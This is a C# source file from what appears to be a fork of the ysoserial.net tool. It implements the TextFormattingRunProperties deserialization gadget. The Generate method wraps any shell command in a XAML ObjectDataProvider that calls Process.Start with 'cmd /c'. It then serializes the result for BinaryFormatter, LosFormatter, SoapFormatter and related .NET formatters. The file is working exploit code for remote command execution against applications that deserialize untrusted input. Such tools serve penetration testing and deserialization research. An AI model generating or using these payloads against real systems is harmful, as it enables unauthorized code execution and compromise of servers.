using System;
using System.Runtime.Serialization;
using System.Collections.Generic;
using Microsoft.VisualStudio.Text.Formatting;

namespace ysoserial_frmv2.Generators
{
    [Serializable]
    public class TextFormattingRunPropertiesMarshal : ISerializable
    {
        protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context)
        {

        }

        string _xaml;
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            Type typeTFRP = typeof(TextFormattingRunProperties);
            info.SetType(typeTFRP);
            info.AddValue("ForegroundBrush", _xaml);
        }
        public TextFormattingRunPropertiesMarshal(string xaml)
        {
            _xaml = xaml;
        }
    }

    class TextFormattingRunPropertiesGenerator : GenericGenerator
    {
        public override string Name()
        {
            return "TextFormattingRunProperties";
        }

        public override string Description()
        {
            return "TextFormattingRunProperties Gadget by Oleksandr Mirosh and Alvaro Munoz";
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter" };
        }

        public override object Generate(string cmd, string formatter, Boolean test)
        {
            string xaml_payload = @"<ResourceDictionary
  xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
  xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
  xmlns:System=""clr-namespace:System;assembly=mscorlib""
  xmlns:Diag=""clr-namespace:System.Diagnostics;assembly=system"">
	 <ObjectDataProvider x:Key=""LaunchCalc"" ObjectType = ""{ x:Type Diag:Process}"" MethodName = ""Start"" >
     <ObjectDataProvider.MethodParameters>
        <System:String>cmd</System:String>
        <System:String>/c """ + cmd + @""" </System:String>
     </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>";

            TextFormattingRunPropertiesMarshal payload = new TextFormattingRunPropertiesMarshal(xaml_payload);
            return Serialize(payload, formatter, test);
        }

    }
}
